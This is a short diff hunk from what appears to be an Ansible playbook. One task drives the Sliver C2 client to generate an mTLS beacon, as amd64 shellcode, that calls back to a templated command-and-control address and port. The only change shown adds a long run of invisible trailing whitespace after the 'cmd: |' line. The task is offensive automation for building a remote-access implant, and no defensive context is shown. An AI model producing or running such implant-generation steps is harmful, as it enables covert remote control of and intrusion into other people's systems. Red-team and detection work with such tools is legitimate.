@@ -45,7 +45,7 @@
 
     - name: Generate a Sliver beacon
       ansible.builtin.shell:
-        cmd: |
+        cmd: |                                                                                                                                                                                                                                                    
           sliver-client --connect {{ sliver_server_ip }}:{{ sliver_server_port }} --skip-update <<EOF
           use beacon
           generate beacon --mtls {{ c2_address }}:{{ c2_port }} --arch amd64 --format shellcode --name {{ beacon_name }}
